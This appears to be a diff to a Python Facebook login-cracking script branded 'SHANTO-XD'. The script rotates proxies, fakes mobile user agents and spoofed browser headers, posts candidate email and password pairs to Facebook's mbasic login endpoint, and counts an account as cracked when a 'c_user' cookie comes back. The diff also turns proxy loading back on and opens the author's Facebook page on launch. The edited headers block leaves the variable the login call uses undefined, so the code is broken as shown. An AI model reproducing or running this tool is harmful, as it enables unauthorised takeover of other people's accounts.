@@ -1,8 +1,8 @@
 #-----------------[ IMPORT-MODULE ]-------------------
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
-#import requests,bs4,json,os,sys,random,datetime,time,re
-#import urllib3,rich,base64
+import requests,bs4,json,os,sys,random,datetime,time,re
+import urllib3,rich,base64
 os.system("xdg-open https://www.facebook.com/rjshanto723")
 from rich.table import Table as me
 from rich.console import Console as sol
@@ -43,10 +43,10 @@ except ModuleNotFoundError:
 except:pass
 
 import os,sys,time,json,random,re,string,platform,base64,uuid
-os.system("git pull")
+#os.system("git pull")
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
-#import requests as ress
+import requests as ress
 from datetime import date
 from datetime import datetime
 from time import sleep
@@ -99,7 +99,7 @@ try:
 	open('.prox.txt','w').write(prox) 
 except Exception as e:
 	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[SHANTO-XD')
-#prox=open('.prox.txt','r').read().splitlines()
+prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
 	a='Mozilla/5.0 (Symbian/3; Series60/'
 	b=random.randrange(1, 9)
@@ -549,21 +549,21 @@ def rcerek(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-        	header_freefb = {"authority": 'mbasic.facebook.com',
-            'method': 'GET',
-            'scheme': 'https', 
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Opera";v="96"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"macOS"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent':pro}
+        	headers = {'authority': 'free.facebook.com',
+     'method': 'GET',
+    'scheme': 'https', 
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+}
         	lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
         	log_cookies=session.cookies.get_dict().keys()
         	if 'c_user' in log_cookies:
